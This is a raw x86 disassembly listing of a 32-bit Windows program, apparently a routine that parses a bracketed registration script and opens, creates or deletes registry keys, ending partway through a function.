  4031a3:	mov    BYTE PTR [ebp-0x4],bl
  4031a6:	mov    esi,eax
  4031a8:	call   0x40461f
  4031ad:	test   esi,esi
  4031af:	je     0x4030e8
  4031b5:	mov    esi,DWORD PTR [ebp-0x64]
  4031b8:	cmp    DWORD PTR [edi],esi
  4031ba:	je     0x4031ca
  4031bc:	push   DWORD PTR [edi]
  4031be:	call   DWORD PTR ds:0x4080f4
  4031c4:	mov    DWORD PTR [edi],eax
  4031c6:	cmp    eax,esi
  4031c8:	jne    0x4031bc
  4031ca:	push   0x25
  4031cc:	pop    esi
  4031cd:	push   DWORD PTR [edi]
  4031cf:	call   DWORD PTR ds:0x4080f4
  4031d5:	mov    DWORD PTR [edi],eax
  4031d7:	cmp    WORD PTR [eax],bx
  4031da:	jne    0x403100
  4031e0:	mov    eax,DWORD PTR [ebp-0x60]
  4031e3:	mov    ecx,DWORD PTR [ebp-0x54]
  4031e6:	mov    DWORD PTR [ebp-0x54],ebx
  4031e9:	mov    DWORD PTR [eax],ecx
  4031eb:	push   DWORD PTR [ebp-0x54]
  4031ee:	call   DWORD PTR ds:0x40802c
  4031f4:	mov    eax,ebx
  4031f6:	jmp    0x40320b
  4031f8:	mov    ebx,0x80004005
  4031fd:	jmp    0x4031eb
  4031ff:	mov    ebx,0x80020009
  403204:	jmp    0x4031eb
  403206:	mov    eax,0x80004003
  40320b:	call   0x405a8a
  403210:	ret    0x8
  403213:	int3   
  403214:	int3   
  403215:	int3   
  403216:	int3   
  403217:	int3   
  403218:	mov    edi,edi
  40321a:	push   ebp
  40321b:	mov    ebp,esp
  40321d:	mov    eax,0x200c
  403222:	call   0x405bb0
  403227:	mov    eax,ds:0x40700c
  40322c:	xor    eax,ebp
  40322e:	mov    DWORD PTR [ebp-0x4],eax
  403231:	mov    eax,DWORD PTR [ebp+0x8]
  403234:	and    DWORD PTR [ebp-0x2008],0x0
  40323b:	push   esi
  40323c:	push   edi
  40323d:	mov    edi,ecx
  40323f:	lea    ecx,[ebp-0x2008]
  403245:	push   ecx
  403246:	push   eax
  403247:	mov    ecx,edi
  403249:	call   0x403067
  40324e:	mov    esi,eax
  403250:	test   esi,esi
  403252:	js     0x40335f
  403258:	mov    eax,DWORD PTR [ebp-0x2008]
  40325e:	xor    ecx,ecx
  403260:	mov    DWORD PTR [edi],eax
  403262:	cmp    cx,WORD PTR [eax]
  403265:	je     0x403351
  40326b:	push   ebx
  40326c:	lea    eax,[ebp-0x2004]
  403272:	mov    ecx,edi
  403274:	push   eax
  403275:	call   0x4029a5
  40327a:	mov    esi,eax
  40327c:	test   esi,esi
  40327e:	js     0x403350
  403284:	xor    esi,esi
  403286:	push   DWORD PTR [esi*8+0x401540]
  40328d:	lea    eax,[ebp-0x2004]
  403293:	push   eax
  403294:	call   DWORD PTR ds:0x4080fc
  40329a:	test   eax,eax
  40329c:	je     0x4032a8
  40329e:	inc    esi
  40329f:	cmp    esi,0xe
  4032a2:	jb     0x403286
  4032a4:	xor    ebx,ebx
  4032a6:	jmp    0x4032af
  4032a8:	mov    ebx,DWORD PTR [esi*8+0x401544]
  4032af:	test   ebx,ebx
  4032b1:	je     0x40334b
  4032b7:	lea    eax,[ebp-0x2004]
  4032bd:	mov    ecx,edi
  4032bf:	push   eax
  4032c0:	call   0x4029a5
  4032c5:	mov    esi,eax
  4032c7:	test   esi,esi
  4032c9:	js     0x403350
  4032cf:	push   0x7b
  4032d1:	pop    eax
  4032d2:	cmp    ax,WORD PTR [ebp-0x2004]
  4032d9:	jne    0x40334b
  4032db:	cmp    DWORD PTR [ebp+0xc],0x0
  4032df:	mov    ecx,edi
  4032e1:	push   0x0
  4032e3:	je     0x403320
  4032e5:	push   DWORD PTR [ebp+0xc]
  4032e8:	mov    eax,DWORD PTR [edi]
  4032ea:	mov    DWORD PTR [ebp-0x200c],eax
  4032f0:	lea    eax,[ebp-0x2004]
  4032f6:	push   ebx
  4032f7:	push   eax
  4032f8:	call   0x403376
  4032fd:	mov    esi,eax
  4032ff:	test   esi,esi
  403301:	jns    0x403335
  403303:	mov    eax,DWORD PTR [ebp-0x200c]
  403309:	mov    ecx,edi
  40330b:	push   0x0
  40330d:	push   0x0
  40330f:	mov    DWORD PTR [edi],eax
  403311:	lea    eax,[ebp-0x2004]
  403317:	push   ebx
  403318:	push   eax
  403319:	call   0x403376
  40331e:	jmp    0x403350
  403320:	push   0x0
  403322:	push   ebx
  403323:	lea    eax,[ebp-0x2004]
  403329:	push   eax
  40332a:	call   0x403376
  40332f:	mov    esi,eax
  403331:	test   esi,esi
  403333:	js     0x403350
  403335:	mov    ecx,edi
  403337:	call   0x402975
  40333c:	mov    eax,DWORD PTR [edi]
  40333e:	xor    ecx,ecx
  403340:	cmp    cx,WORD PTR [eax]
  403343:	jne    0x40326c
  403349:	jmp    0x403350
  40334b:	mov    esi,0x80020009
  403350:	pop    ebx
  403351:	push   DWORD PTR [ebp-0x2008]
  403357:	call   DWORD PTR ds:0x40802c
  40335d:	mov    eax,esi
  40335f:	mov    ecx,DWORD PTR [ebp-0x4]
  403362:	pop    edi
  403363:	xor    ecx,ebp
  403365:	pop    esi
  403366:	call   0x405170
  40336b:	mov    esp,ebp
  40336d:	pop    ebp
  40336e:	ret    0x8
  403371:	int3   
  403372:	int3   
  403373:	int3   
  403374:	int3   
  403375:	int3   
  403376:	mov    edi,edi
  403378:	push   ebp
  403379:	mov    ebp,esp
  40337b:	and    esp,0xfffffff8
  40337e:	push   0xffffffff
  403380:	push   0x405d74
  403385:	mov    eax,fs:0x0
  40338b:	push   eax
  40338c:	push   ecx
  40338d:	mov    eax,0x2264
  403392:	call   0x405bb0
  403397:	mov    eax,ds:0x40700c
  40339c:	xor    eax,esp
  40339e:	mov    DWORD PTR [esp+0x2260],eax
  4033a5:	push   ebx
  4033a6:	push   esi
  4033a7:	push   edi
  4033a8:	mov    eax,ds:0x40700c
  4033ad:	xor    eax,esp
  4033af:	push   eax
  4033b0:	lea    eax,[esp+0x2278]
  4033b7:	mov    fs:0x0,eax
  4033bd:	mov    eax,ecx
  4033bf:	mov    DWORD PTR [esp+0x18],eax
  4033c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4033c6:	mov    edi,DWORD PTR [ebp+0x8]
  4033c9:	mov    DWORD PTR [esp+0x20],ecx
  4033cd:	xor    ecx,ecx
  4033cf:	mov    ebx,ecx
  4033d1:	mov    DWORD PTR [esp+0x34],ecx
  4033d5:	mov    DWORD PTR [esp+0x28],ebx
  4033d9:	mov    DWORD PTR [esp+0x2c],ecx
  4033dd:	mov    DWORD PTR [esp+0x30],ecx
  4033e1:	mov    DWORD PTR [esp+0x2280],ecx
  4033e8:	mov    ecx,DWORD PTR [ebp+0x14]
  4033eb:	mov    DWORD PTR [esp+0x38],ecx
  4033ef:	mov    ecx,eax
  4033f1:	push   edi
  4033f2:	call   0x4029a5
  4033f7:	mov    esi,eax
  4033f9:	test   esi,esi
  4033fb:	js     0x403953
  403401:	jmp    0x403910
  403406:	push   0x40121c
  40340b:	push   edi
  40340c:	mov    DWORD PTR [esp+0x1c],0x1
  403414:	call   DWORD PTR ds:0x4080fc
  40341a:	neg    eax
  40341c:	push   0x4011f0
  403421:	sbb    esi,esi
  403423:	inc    esi
  403424:	push   edi
  403425:	mov    DWORD PTR [esp+0x24],esi
  403429:	call   DWORD PTR ds:0x4080fc
  40342f:	test   eax,eax
  403431:	je     0x40343b
  403433:	test   esi,esi
  403435:	je     0x4034c1
  40343b:	mov    ecx,DWORD PTR [esp+0x18]
  40343f:	push   edi
  403440:	call   0x4029a5
  403445:	mov    esi,eax
  403447:	test   esi,esi
  403449:	js     0x403948
  40344f:	cmp    DWORD PTR [ebp+0x10],0x0
  403453:	je     0x4034c1
  403455:	xor    eax,eax
  403457:	mov    ecx,edi
  403459:	push   0x5c
  40345b:	pop    edx
  40345c:	mov    DWORD PTR [esp+0x3c],eax
  403460:	mov    DWORD PTR [esp+0x40],eax
  403464:	mov    DWORD PTR [esp+0x44],eax
  403468:	call   0x402942
  40346d:	test   eax,eax
  40346f:	jne    0x403943
  403475:	push   edi
  403476:	call   0x402f85
  40347b:	test   eax,eax
  40347d:	je     0x403497
  40347f:	mov    eax,DWORD PTR [esp+0x20]
  403483:	lea    ecx,[esp+0x3c]
  403487:	push   edi
  403488:	mov    DWORD PTR [esp+0x40],eax
  40348c:	call   0x4020e5
  403491:	xor    eax,eax
  403493:	mov    DWORD PTR [esp+0x3c],eax
  403497:	cmp    DWORD PTR [esp+0x1c],0x0
  40349c:	je     0x4034c1
  40349e:	mov    ecx,DWORD PTR [esp+0x18]
  4034a2:	push   edi
  4034a3:	call   0x4029a5
  4034a8:	mov    esi,eax
  4034aa:	test   esi,esi
  4034ac:	js     0x403948
  4034b2:	mov    ecx,DWORD PTR [esp+0x18]
  4034b6:	push   edi
  4034b7:	call   0x402ff9
  4034bc:	jmp    0x403701
  4034c1:	push   0x401208
  4034c6:	push   edi
  4034c7:	call   DWORD PTR ds:0x4080fc
  4034cd:	test   eax,eax
  4034cf:	jne    0x4034e9
  4034d1:	mov    ecx,DWORD PTR [esp+0x18]
  4034d5:	push   edi
  4034d6:	mov    DWORD PTR [esp+0x18],eax
  4034da:	call   0x4029a5
  4034df:	mov    esi,eax
  4034e1:	test   esi,esi
  4034e3:	js     0x403948
  4034e9:	push   0x4011e8
  4034ee:	push   edi
  4034ef:	call   DWORD PTR ds:0x4080fc
  4034f5:	test   eax,eax
  4034f7:	jne    0x403604
  4034fd:	mov    ecx,DWORD PTR [esp+0x18]
  403501:	lea    eax,[esp+0x26c]
  403508:	push   eax
  403509:	call   0x4029a5
  40350e:	mov    esi,eax
  403510:	test   esi,esi
  403512:	js     0x403948
  403518:	mov    ecx,DWORD PTR [esp+0x18]
  40351c:	push   edi
  40351d:	call   0x4029a5
  403522:	mov    esi,eax
  403524:	test   esi,esi
  403526:	js     0x403948
  40352c:	push   0x3d
  40352e:	pop    eax
  40352f:	cmp    WORD PTR [edi],ax
  403532:	jne    0x403943
  403538:	cmp    DWORD PTR [ebp+0x10],0x0
  40353c:	je     0x40358b
  40353e:	xor    eax,eax
  403540:	mov    DWORD PTR [esp+0x4c],eax
  403544:	mov    DWORD PTR [esp+0x50],eax
  403548:	mov    eax,DWORD PTR [esp+0x20]
  40354c:	mov    ecx,DWORD PTR [esp+0x18]
  403550:	mov    BYTE PTR [esp+0x2280],0x1
  403558:	mov    DWORD PTR [esp+0x48],eax
  40355c:	lea    eax,[esp+0x26c]
  403563:	push   edi
  403564:	push   eax
  403565:	lea    eax,[esp+0x50]
  403569:	push   eax
  40356a:	call   0x402aea
  40356f:	mov    esi,eax
  403571:	xor    eax,eax
  403573:	mov    DWORD PTR [esp+0x48],eax
  403577:	test   esi,esi
  403579:	js     0x403948
  40357f:	mov    BYTE PTR [esp+0x2280],al
  403586:	jmp    0x40370b
  40358b:	cmp    DWORD PTR [ebp+0x14],0x0
  40358f:	jne    0x4035eb
  403591:	cmp    DWORD PTR [esp+0x14],0x0
  403596:	je     0x4035eb
  403598:	lea    eax,[esp+0x14]
  40359c:	xor    ecx,ecx
  40359e:	push   eax
  40359f:	push   0x20006
  4035a4:	push   ecx
  4035a5:	push   ecx
  4035a6:	push   DWORD PTR [esp+0x30]
  4035aa:	mov    DWORD PTR [esp+0x28],ecx
  4035ae:	call   DWORD PTR ds:0x4080b4
  4035b4:	test   eax,eax
  4035b6:	jne    0x403938
  4035bc:	mov    esi,DWORD PTR [esp+0x14]
  4035c0:	lea    eax,[esp+0x26c]
  4035c7:	push   eax
  4035c8:	push   esi
  4035c9:	mov    DWORD PTR [esp+0x24],esi
  4035cd:	call   DWORD PTR ds:0x4080b8
  4035d3:	test   eax,eax
  4035d5:	je     0x4035e0
  4035d7:	cmp    eax,0x2
  4035da:	jne    0x40391e
  4035e0:	test   esi,esi
  4035e2:	je     0x4035eb
  4035e4:	push   esi
  4035e5:	call   DWORD PTR ds:0x4080cc
  4035eb:	mov    ecx,DWORD PTR [esp+0x18]
  4035ef:	push   edi
  4035f0:	call   0x402ff9
  4035f5:	mov    esi,eax
  4035f7:	test   esi,esi
  4035f9:	js     0x403948
  4035ff:	jmp    0x403910
  403604:	push   0x5c
  403606:	pop    edx
  403607:	mov    ecx,edi
  403609:	call   0x402942
  40360e:	test   eax,eax
  403610:	jne    0x403943
  403616:	cmp    DWORD PTR [ebp+0x10],eax
  403619:	je     0x403760
  40361f:	mov    esi,DWORD PTR [esp+0x20]
  403623:	lea    eax,[esp+0x14]
  403627:	push   eax
  403628:	push   0x2001f
  40362d:	xor    ecx,ecx
  40362f:	push   ecx
  403630:	push   edi
  403631:	push   esi
  403632:	mov    DWORD PTR [esp+0x28],ecx
  403636:	call   DWORD PTR ds:0x4080b4
  40363c:	test   eax,eax
  40363e:	jne    0x403657
  403640:	test   ebx,ebx
  403642:	je     0x40364b
  403644:	push   ebx
  403645:	call   DWORD PTR ds:0x4080cc
  40364b:	mov    ebx,DWORD PTR [esp+0x14]
  40364f:	mov    DWORD PTR [esp+0x28],ebx
  403653:	test   eax,eax
  403655:	je     0x4036cf
  403657:	lea    eax,[esp+0x14]
  40365b:	xor    ecx,ecx
  40365d:	push   eax
  40365e:	push   0x20019
  403663:	push   ecx
  403664:	push   edi
  403665:	push   esi
  403666:	mov    DWORD PTR [esp+0x28],ecx
  40366a:	call   DWORD PTR ds:0x4080b4
  403670:	test   eax,eax
  403672:	jne    0x40368b
  403674:	test   ebx,ebx
  403676:	je     0x40367f
  403678:	push   ebx
  403679:	call   DWORD PTR ds:0x4080cc
  40367f:	mov    ebx,DWORD PTR [esp+0x14]
  403683:	mov    DWORD PTR [esp+0x28],ebx
  403687:	test   eax,eax
  403689:	je     0x4036cf
  40368b:	lea    eax,[esp+0x60]
  40368f:	xor    ecx,ecx
  403691:	push   eax
  403692:	lea    eax,[esp+0x18]
  403696:	mov    DWORD PTR [esp+0x18],ecx
  40369a:	push   eax
  40369b:	push   ecx
  40369c:	push   0x2001f
  4036a1:	push   ecx
  4036a2:	push   ecx
  4036a3:	push   ecx
  4036a4:	push   edi
  4036a5:	push   esi
  4036a6:	call   DWORD PTR ds:0x4080c4
  4036ac:	test   eax,eax
  4036ae:	jne    0x403938
  4036b4:	test   ebx,ebx
  4036b6:	je     0x4036bf
  4036b8:	push   ebx
  4036b9:	call   DWORD PTR ds:0x4080cc
  4036bf:	mov    ebx,DWORD PTR [esp+0x14]
  4036c3:	mov    DWORD PTR [esp+0x28],ebx
  4036c7:	test   eax,eax
  4036c9:	jne    0x403938
  4036cf:	mov    ecx,DWORD PTR [esp+0x18]
  4036d3:	push   edi
  4036d4:	call   0x4029a5
  4036d9:	mov    esi,eax
  4036db:	test   esi,esi
  4036dd:	js     0x403948
  4036e3:	push   0x3d
  4036e5:	pop    eax
  4036e6:	cmp    WORD PTR [edi],ax
  4036e9:	jne    0x40370b
  4036eb:	mov    ecx,DWORD PTR [esp+0x18]
  4036ef:	xor    eax,eax
  4036f1:	push   edi
  4036f2:	push   eax
  4036f3:	lea    eax,[esp+0x30]
  4036f7:	push   eax
  4036f8:	call   0x402aea
  4036fd:	mov    ebx,DWORD PTR [esp+0x28]
  403701:	mov    esi,eax
  403703:	test   esi,esi
  403705:	js     0x403948
  40370b:	push   0x7b
  40370d:	pop    eax
  40370e:	cmp    WORD PTR [edi],ax
  403711:	jne    0x403910
  403717:	mov    ecx,edi
  403719:	lea    edx,[ecx+0x2]
  40371c:	mov    ax,WORD PTR [ecx]
  40371f:	add    ecx,0x2
  403722:	cmp    ax,WORD PTR [esp+0x34]
  403727:	jne    0x40371c
  403729:	sub    ecx,edx
  40372b:	sar    ecx,1
  40372d:	cmp    ecx,0x1
  403730:	jne    0x403910
  403736:	mov    ecx,DWORD PTR [esp+0x18]
  40373a:	xor    eax,eax
  40373c:	push   eax
  40373d:	push   DWORD PTR [ebp+0x10]
  403740:	push   ebx
  403741:	push   edi
  403742:	call   0x403376
  403747:	mov    esi,eax
  403749:	test   esi,esi
  40374b:	js     0x403948
  403751:	mov    ecx,DWORD PTR [esp+0x18]
  403755:	push   edi
  403756:	call   0x4029a5
  40375b:	jmp    0x4035f5
  403760:	cmp    DWORD PTR [ebp+0x14],0x0
  403764:	jne    0x4037a9
  403766:	lea    eax,[esp+0x1c]
  40376a:	xor    esi,esi
  40376c:	push   eax
  40376d:	push   0x20019
  403772:	push   esi
  403773:	push   edi
  403774:	push   DWORD PTR [esp+0x30]
  403778:	mov    DWORD PTR [esp+0x30],esi
  40377c:	call   DWORD PTR ds:0x4080b4
  403782:	mov    DWORD PTR [esp+0x24],eax
  403786:	test   eax,eax
  403788:	jne    0x4037b4
  40378a:	mov    DWORD PTR [esp+0x24],esi
  40378e:	mov    eax,esi
  403790:	test   ebx,ebx
  403792:	je     0x40379f
  403794:	push   ebx
  403795:	call   DWORD PTR ds:0x4080cc
  40379b:	mov    DWORD PTR [esp+0x24],eax
  40379f:	mov    ebx,DWORD PTR [esp+0x1c]
  4037a3:	mov    DWORD PTR [esp+0x28],ebx
  4037a7:	jmp    0x4037b0
  4037a9:	push   0x2
  4037ab:	pop    eax
  4037ac:	mov    DWORD PTR [esp+0x24],eax
  4037b0:	test   eax,eax
  4037b2:	je     0x4037bb
  4037b4:	mov    DWORD PTR [ebp+0x14],0x1
  4037bb:	push   0xffffffff
  4037bd:	push   edi
  4037be:	lea    eax,[esp+0x6c]
  4037c2:	push   0x104
  4037c7:	push   eax
  4037c8:	call   DWORD PTR ds:0x408154
  4037ce:	add    esp,0x10
  4037d1:	mov    ecx,eax
  4037d3:	call   0x401d13
  4037d8:	mov    ecx,DWORD PTR [esp+0x18]
  4037dc:	push   edi
  4037dd:	call   0x4029a5
  4037e2:	mov    esi,eax
  4037e4:	test   esi,esi
  4037e6:	js     0x403948
  4037ec:	mov    ecx,DWORD PTR [esp+0x18]
  4037f0:	push   edi
  4037f1:	call   0x402ff9
  4037f6:	mov    esi,eax
  4037f8:	test   esi,esi
  4037fa:	js     0x403948
  403800:	push   0x7b
  403802:	pop    eax
  403803:	cmp    WORD PTR [edi],ax
  403806:	jne    0x403858
  403808:	mov    ecx,edi
  40380a:	lea    edx,[ecx+0x2]
  40380d:	mov    ax,WORD PTR [ecx]
  403810:	add    ecx,0x2
  403813:	cmp    ax,WORD PTR [esp+0x34]
  403818:	jne    0x40380d
  40381a:	sub    ecx,edx
  40381c:	sar    ecx,1
  40381e:	cmp    ecx,0x1
  403821:	jne    0x403858
  403823:	push   DWORD PTR [ebp+0x14]
  403826:	mov    ecx,DWORD PTR [esp+0x1c]
  40382a:	xor    eax,eax
  40382c:	push   eax
  40382d:	push   ebx
  40382e:	push   edi
  40382f:	call   0x403376
  403834:	mov    esi,eax
  403836:	test   esi,esi
  403838:	jns    0x403844
  40383a:	cmp    DWORD PTR [ebp+0x14],0x0
  40383e:	je     0x403948
  403844:	mov    ecx,DWORD PTR [esp+0x18]
  403848:	push   edi
  403849:	call   0x4029a5
  40384e:	mov    esi,eax
  403850:	test   esi,esi
  403852:	js     0x403948
  403858:	mov    ecx,DWORD PTR [esp+0x24]
  40385c:	mov    eax,DWORD PTR [esp+0x38]
  403860:	mov    DWORD PTR [ebp+0x14],eax
  403863:	cmp    ecx,0x2
  403866:	je     0x403910
  40386c:	test   ecx,ecx
  40386e:	je     0x40387d
  403870:	test   eax,eax
  403872:	je     0x40393a
  403878:	jmp    0x403910
  40387d:	test   eax,eax
  40387f:	je     0x4038b4
  403881:	push   ebx
  403882:	call   0x402fbb
  403887:	test   eax,eax
  403889:	je     0x4038b4
  40388b:	lea    eax,[esp+0x64]
  40388f:	push   eax
  403890:	call   0x402f85
  403895:	test   eax,eax
  403897:	je     0x403910
  403899:	cmp    DWORD PTR [esp+0x14],0x0
  40389e:	je     0x403910
  4038a0:	lea    eax,[esp+0x64]
  4038a4:	push   eax
  4038a5:	lea    ecx,[esp+0x2c]
  4038a9:	call   0x4020e5
  4038ae:	mov    ebx,DWORD PTR [esp+0x28]
  4038b2:	jmp    0x403910
  4038b4:	push   ebx
  4038b5:	call   0x402fbb
  4038ba:	mov    DWORD PTR [esp+0x1c],eax
  4038be:	test   ebx,ebx
  4038c0:	je     0x4038db
  4038c2:	push   ebx
  4038c3:	call   DWORD PTR ds:0x4080cc
  4038c9:	xor    ecx,ecx
  4038cb:	mov    ebx,ecx
  4038cd:	mov    DWORD PTR [esp+0x28],ebx
  4038d1:	test   eax,eax
  4038d3:	jne    0x403938
  4038d5:	mov    eax,DWORD PTR [esp+0x1c]
  4038d9:	jmp    0x4038dd
  4038db:	xor    ecx,ecx
  4038dd:	cmp    DWORD PTR [esp+0x14],0x0
  4038e2:	je     0x403910
  4038e4:	test   eax,eax
  4038e6:	jne    0x403910
  4038e8:	mov    eax,DWORD PTR [esp+0x20]
  4038ec:	mov    DWORD PTR [esp+0x54],eax
  4038f0:	lea    eax,[esp+0x64]
  4038f4:	mov    DWORD PTR [esp+0x58],ecx
  4038f8:	mov    DWORD PTR [esp+0x5c],ecx
  4038fc:	lea    ecx,[esp+0x54]
  403900:	push   eax
  403901:	call   0x401fc8
  403906:	xor    ecx,ecx
  403908:	mov    DWORD PTR [esp+0x54],ecx
  40390c:	test   eax,eax
  40390e:	jne    0x403938
  403910:	push   0x7d
  403912:	pop    eax
  403913:	cmp    WORD PTR [edi],ax
  403916:	jne    0x403406
  40391c:	jmp    0x403948
  40391e:	mov    ecx,eax
  403920:	call   0x401daf
  403925:	mov    esi,eax
  403927:	mov    eax,DWORD PTR [esp+0x1c]
  40392b:	test   eax,eax
  40392d:	je     0x403948
  40392f:	push   eax
  403930:	call   DWORD PTR ds:0x4080cc
  403936:	jmp    0x403948
  403938:	mov    ecx,eax
  40393a:	call   0x401daf
  40393f:	mov    esi,eax
  403941:	jmp    0x403948
  403943:	mov    esi,0x80020009
  403948:	test   ebx,ebx
  40394a:	je     0x403953
  40394c:	push   ebx
  40394d:	call   DWORD PTR ds:0x4080cc
  403953:	mov    eax,esi
  403955:	mov    ecx,DWORD PTR [esp+0x2278]
  40395c:	mov    DWORD PTR fs:0x0,ecx
  403963:	pop    ecx
  403964:	pop    edi
  403965:	pop    esi
  403966:	pop    ebx
  403967:	mov    ecx,DWORD PTR [esp+0x2260]
  40396e:	xor    ecx,esp
  403970:	call   0x405170
  403975:	mov    esp,ebp
  403977:	pop    ebp
  403978:	ret    0x10
  40397b:	int3   
  40397c:	int3   
  40397d:	int3   
  40397e:	int3   
  40397f:	int3   
  403980:	mov    edi,edi
  403982:	push   ebp
  403983:	mov    ebp,esp
  403985:	sub    esp,0xa68
  40398b:	mov    eax,ds:0x40700c
  403990:	xor    eax,ebp
  403992:	mov    DWORD PTR [ebp-0x4],eax
  403995:	push   ebx
  403996:	push   esi
  403997:	mov    esi,DWORD PTR [ebp+0xc]
  40399a:	mov    ebx,edx
  40399c:	push   edi
  40399d:	xor    edx,edx
  40399f:	mov    DWORD PTR [ebp-0xa38],ecx
  4039a5:	push   0x6
  4039a7:	pop    ecx
  4039a8:	xor    eax,eax
  4039aa:	mov    DWORD PTR [ebp-0xa68],0x401524
  4039b4:	mov    DWORD PTR [ebp-0xa64],edx
  4039ba:	lea    edi,[ebp-0xa58]
  4039c0:	mov    DWORD PTR [ebp-0xa60],edx
  4039c6:	mov    DWORD PTR [ebp-0xa5c],edx
  4039cc:	rep stos DWORD PTR es:[edi],eax
  4039ce:	lea    ecx,[ebp-0xa58]
  4039d4:	mov    BYTE PTR [ebp-0xa40],dl
  4039da:	call   0x401d4b
  4039df:	test   eax,eax
  4039e1:	js     0x403bb3
  4039e7:	mov    BYTE PTR [ebp-0xa40],0x1
  4039ee:	test   esi,esi
  4039f0:	je     0x403a0d
  4039f2:	jmp    0x403a07
  4039f4:	push   DWORD PTR [esi+0x4]
  4039f7:	push   eax
  4039f8:	lea    eax,[ebp-0xa68]
  4039fe:	push   eax
  4039ff:	call   0x4025c0
  403a04:	lea    esi,[esi+0x8]
  403a07:	mov    eax,DWORD PTR [esi]
  403a09:	test   eax,eax
  403a0b:	jne    0x4039f4
  403a0d:	mov    ecx,DWORD PTR [ebp-0xa38]
  403a13:	lea    eax,[ebp-0xa68]
  403a19:	push   eax
  403a1a:	call   0x404640
  403a1f:	mov    esi,eax
  403a21:	test   esi,esi
  403a23:	js     0x403bb5
  403a29:	mov    esi,DWORD PTR ds:0x407554
  403a2f:	lea    eax,[ebp-0x20c]
  403a35:	push   0x104
  403a3a:	push   eax
  403a3b:	xor    edi,edi
  403a3d:	push   esi
  403a3e:	mov    DWORD PTR [ebp-0xa3c],edi
  403a44:	call   DWORD PTR ds:0x408084
  403a4a:	test   eax,eax
  403a4c:	jne    0x403a65
  403a4e:	call   0x401d97
  403a53:	mov    esi,eax
  403a55:	lea    ecx,[ebp-0xa3c]
  403a5b:	call   0x40461f
  403a60:	jmp    0x403bb5
  403a65:	cmp    eax,0x104
  403a6a:	jne    0x403a81
  403a6c:	lea    ecx,[ebp-0xa3c]
  403a72:	call   0x40461f
  403a77:	mov    esi,0x8007007a
  403a7c:	jmp    0x403bb5
  403a81:	lea    eax,[ebp-0x20c]
  403a87:	mov    edx,0x208
  403a8c:	push   eax
  403a8d:	lea    ecx,[ebp-0xa34]
  403a93:	call   0x401ed4
  403a98:	test   esi,esi
  403a9a:	je     0x403aaf
  403a9c:	push   edi
  403a9d:	call   DWORD PTR ds:0x408074
  403aa3:	cmp    esi,eax
  403aa5:	je     0x403aaf
  403aa7:	lea    eax,[ebp-0xa34]
  403aad:	jmp    0x403b1e
  403aaf:	push   0x22
  403ab1:	pop    esi
  403ab2:	lea    eax,[ebp-0xa34]
  403ab8:	mov    WORD PTR [ebp-0x624],si
  403abf:	push   eax
  403ac0:	mov    edx,0x20a
  403ac5:	lea    ecx,[ebp-0x622]
  403acb:	call   0x401c86
  403ad0:	test   al,al
  403ad2:	jne    0x403ae9
  403ad4:	lea    ecx,[ebp-0xa3c]
  403ada:	call   0x40461f
  403adf:	mov    esi,0x80004005
  403ae4:	jmp    0x403bb5
  403ae9:	lea    ecx,[ebp-0x624]
  403aef:	call   0x401c65
  403af4:	mov    WORD PTR [ebp+eax*2-0x624],si
  403afc:	lea    eax,[eax*2+0x2]
  403b03:	cmp    eax,0x418
  403b08:	jae    0x403bd5
  403b0e:	xor    ecx,ecx
  403b10:	mov    WORD PTR [ebp+eax*1-0x624],cx
  403b18:	lea    eax,[ebp-0x624]
  403b1e:	push   eax
  403b1f:	push   0x401438
  403b24:	lea    eax,[ebp-0xa68]
  403b2a:	push   eax
  403b2b:	call   0x4025c0
  403b30:	mov    esi,eax
  403b32:	test   esi,esi
  403b34:	js     0x403a55
  403b3a:	lea    eax,[ebp-0xa34]
  403b40:	push   eax
  403b41:	push   0x401448
  403b46:	lea    eax,[ebp-0xa68]
  403b4c:	push   eax
  403b4d:	call   0x4025c0
  403b52:	mov    esi,eax
  403b54:	test   esi,esi
  403b56:	js     0x403a55
  403b5c:	mov    DWORD PTR [ebp-0xa38],edi
  403b62:	cmp    DWORD PTR [ebp+0x8],edi
  403b65:	je     0x403b6f
  403b67:	test   ebx,ebx
  403b69:	je     0x403b9e
  403b6b:	push   0x1
  403b6d:	jmp    0x403b74
  403b6f:	test   ebx,ebx
  403b71:	je     0x403b9e
  403b73:	push   edi
  403b74:	push   0x401460
  403b79:	push   ebx
  403b7a:	lea    eax,[ebp-0x20c]
  403b80:	push   eax
  403b81:	lea    ecx,[ebp-0xa68]
  403b87:	call   0x402630
  403b8c:	lea    ecx,[ebp-0xa38]
  403b92:	mov    esi,eax
  403b94:	call   0x40461f
  403b99:	jmp    0x403a55
  403b9e:	lea    ecx,[ebp-0xa38]
  403ba4:	call   0x40461f
  403ba9:	mov    esi,0x80070057
  403bae:	jmp    0x403a55
  403bb3:	mov    esi,eax
  403bb5:	lea    ecx,[ebp-0xa68]
  403bbb:	call   0x40251a
  403bc0:	mov    ecx,DWORD PTR [ebp-0x4]
  403bc3:	mov    eax,esi
  403bc5:	pop    edi
  403bc6:	pop    esi
  403bc7:	xor    ecx,ebp
  403bc9:	pop    ebx
  403bca:	call   0x405170
  403bcf:	mov    esp,ebp
  403bd1:	pop    ebp
  403bd2:	ret    0x8
  403bd5:	call   0x4053d0
  403bda:	int3   
  403bdb:	int3   
  403bdc:	int3   
  403bdd:	int3   
  403bde:	int3   
  403bdf:	int3   
  403be0:	mov    edi,edi
  403be2:	push   ebp
  403be3:	mov    ebp,esp
  403be5:	sub    esp,0xa6c
  403beb:	mov    eax,ds:0x40700c
  403bf0:	xor    eax,ebp
  403bf2:	mov    DWORD PTR [ebp-0x4],eax
  403bf5:	push   ebx
  403bf6:	push   esi
  403bf7:	mov    esi,DWORD PTR [ebp+0xc]
  403bfa:	mov    ebx,ecx
  403bfc:	push   edi
  403bfd:	mov    DWORD PTR [ebp-0xa40],edx
  403c03:	lea    edi,[ebp-0xa5c]
  403c09:	xor    edx,edx
  403c0b:	mov    DWORD PTR [ebp-0xa6c],0x401524
  403c15:	push   0x6
  403c17:	pop    ecx
  403c18:	xor    eax,eax
  403c1a:	mov    DWORD PTR [ebp-0xa68],edx
  403c20:	mov    DWORD PTR [ebp-0xa64],edx
  403c26:	mov    DWORD PTR [ebp-0xa60],edx
  403c2c:	rep stos DWORD PTR es:[edi],eax
  403c2e:	lea    ecx,[ebp-0xa5c]
  403c34:	mov    BYTE PTR [ebp-0xa44],dl
  403c3a:	call   0x401d4b
  403c3f:	test   eax,eax
  403c41:	js     0x403df9
  403c47:	mov    BYTE PTR [ebp-0xa44],0x1
  403c4e:	test   esi,esi
  403c50:	je     0x403c6d
  403c52:	jmp    0x403c67
  403c54:	push   DWORD PTR [esi+0x4]
